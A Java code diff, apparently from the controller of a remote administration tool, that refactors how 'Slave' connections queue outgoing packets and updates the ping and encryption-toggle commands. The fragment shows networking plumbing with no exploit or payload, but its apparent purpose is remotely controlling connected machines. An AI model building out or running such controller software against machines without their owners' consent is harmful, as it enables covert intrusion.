@@ -21,9 +21,9 @@ import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.ip2c.Country;
 import com.redpois0n.net.ConnectionHandler;
 import com.redpois0n.net.PortListener;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
 import com.redpois0n.packets.incoming.Packets;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.plugins.PluginEventHandler;
 import com.redpois0n.settings.Settings;
 import com.redpois0n.ui.frames.Frame;
@@ -31,6 +31,8 @@ import com.redpois0n.ui.panels.PanelMainLog;
 import com.redpois0n.utils.FlagUtils;
 import com.redpois0n.utils.TrayIconUtils;
 import com.redpois0n.utils.Util;
+
+import com.redpois0n.packets.outgoing.*;
 
 @SuppressWarnings("unused")
 public class Slave implements Runnable {
@@ -181,6 +183,22 @@ public class Slave implements Runnable {
 		}
 		packet.write(this);
 	}*/
+	
+	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
+		while (lock) {
+			try {
+				Thread.sleep(10L);
+			} catch (Exception ex) {
+				ex.printStackTrace();
+			}
+
+		}
+		try {
+			packet.send(this, dos);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
 
 	public void writeShort(short i) throws Exception {
 		dos.writeShort(i);
@@ -613,7 +631,7 @@ public class Slave implements Runnable {
 	}
 
 	public void ping() throws Exception {
-		addToSendQueue(Header.PING);
+		addToSendQueue(OutgoingHeader.PING);
 		pingms = System.currentTimeMillis();
 	}
 
@@ -625,7 +643,7 @@ public class Slave implements Runnable {
 		encryption = b;
 
 		for (Slave slave : Main.connections) {
-			slave.addToSendQueue(new PacketBuilder(Header.ENCRYPTION, b));
+			slave.addToSendQueue(new PacketBuilder(OutgoingHeader.ENCRYPTION, b));
 		}
 
 	}
